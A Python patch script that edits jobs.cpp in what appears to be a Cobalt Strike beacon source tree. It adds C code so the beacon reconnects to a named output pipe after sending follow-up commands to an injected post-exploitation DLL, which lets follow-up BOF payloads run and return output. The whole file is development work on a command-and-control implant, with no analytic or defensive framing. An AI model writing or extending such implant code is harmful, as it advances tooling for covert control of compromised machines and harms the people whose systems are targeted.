# -*- coding: utf-8 -*-
"""fix_jobdata_reconnect.py - add the OUT pipe reconnect to command_job_data
postex_ctrl fallback.  The kit's bg loop spawns a follow-up job whose runner
creates a NEW instance of the output pipe and blocks in ConnectNamedPipe
until the beacon connects again; without this the follow-up BOF never runs."""
import io

P = (r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-beacon"
     r"\feat-post-4.9.1\src\jobs.cpp")
s = io.open(P, encoding="utf-8").read()

old = ('	/* kit DLL fallback: if the jid lookup misses, write to the postex_ctrl\n'
       '	 * pipe handle (tracked by command_job_spawn_user after kit DLL injection).\n'
       '	 * The kit DLL\'s bg loop reads follow-ups from this pipe. */\n'
       '	temp = psh_list;\n'
       '	while (temp != NULL) {\n'
       '		if (temp->status != JOB_STATUS_DEAD &&\n'
       '		    strstr(temp->description, "postex_ctrl") != NULL) {\n'
       '			if (!WriteFile(temp->read_stdout, data, dlen, &written, NULL)) {\n'
       '				post_error_d(0x55, GetLastError());\n'
       '			}\n'
       '			return;\n'
       '		}\n'
       '		temp = (psh_entry*)temp->next;\n'
       '	}')
new = ('	/* kit DLL fallback: if the jid lookup misses, write to the postex_ctrl\n'
       '	 * pipe handle (tracked by command_job_spawn_user after kit DLL injection).\n'
       '	 * The kit DLL\'s bg loop reads follow-ups from this pipe. */\n'
       '	temp = psh_list;\n'
       '	while (temp != NULL) {\n'
       '		if (temp->status != JOB_STATUS_DEAD &&\n'
       '		    strstr(temp->description, "postex_ctrl") != NULL) {\n'
       '			if (!WriteFile(temp->read_stdout, data, dlen, &written, NULL)) {\n'
       '				post_error_d(0x55, GetLastError());\n'
       '			}\n'
       '			else {\n'
       '				/* C-36: the follow-up frame makes the kit\'s bg loop spawn a\n'
       '				 * new job whose runner creates a NEW instance of the output\n'
       '				 * pipe and blocks in ConnectNamedPipe until we connect again.\n'
       '				 * The output pipe name rides in the tracked description\n'
       '				 * ("postex_ctrl|<outname>", captured at spawn time from the\n'
       '				 * postex args blob).  Reconnect and track it as a fresh\n'
       '				 * message-mode job so the follow-up BOF runs and its chunks\n'
       '				 * flow back through the normal psh_poll read loop. */\n'
       '				char * outname = strstr(temp->description, "|");\n'
       '				if (outname != NULL) {\n'
       '					HANDLE out_h = INVALID_HANDLE_VALUE;\n'
       '					int x;\n'
       '					outname++;\n'
       '					for (x = 0; x < 20; x++) {\n'
       '						if (connect_pipe(outname, &out_h)) {\n'
       '							pipe_track(out_h, temp->pid, CALLBACK_OUTPUT,\n'
       '							           "postex_out", JOB_MODE_MESSAGE);\n'
       '							break;\n'
       '						}\n'
       '						Sleep(500);\n'
       '					}\n'
       '				}\n'
       '			}\n'
       '			return;\n'
       '		}\n'
       '		temp = (psh_entry*)temp->next;\n'
       '	}')
assert old in s, "postex_ctrl fallback block not found"
s = s.replace(old, new)
io.open(P, "w", encoding="utf-8", newline="").write(s)
print("jobs.cpp reconnect added")
